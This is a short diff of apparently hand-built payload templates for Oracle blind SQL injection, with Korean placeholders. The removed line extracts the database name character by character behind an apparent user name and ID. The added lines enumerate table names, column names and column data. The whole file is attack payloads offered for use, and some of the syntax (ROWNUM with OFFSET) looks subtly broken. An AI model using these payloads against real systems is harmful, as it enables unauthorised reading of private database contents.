@@ -1,1 +1,5 @@
-김황(X0148366)' AND SUBSTR((SELECT sys_context('userenv','db_name') FROM dual), {i}, 1) = '{char}' --
+' AND SUBSTR((SELECT table_name FROM all_tables WHERE ROWNUM = 1 OFFSET {i}), {j}, 1) = '{char}' --
+
+' AND SUBSTR((SELECT column_name FROM all_tab_columns WHERE table_name = '테이블_이름' AND ROWNUM = 1 OFFSET {i}), {j}, 1) = '{char}' --
+
+' AND SUBSTR((SELECT column_name FROM 테이블_이름 WHERE ROWNUM = 1 OFFSET {i}), {j}, 1) = '{char}' --
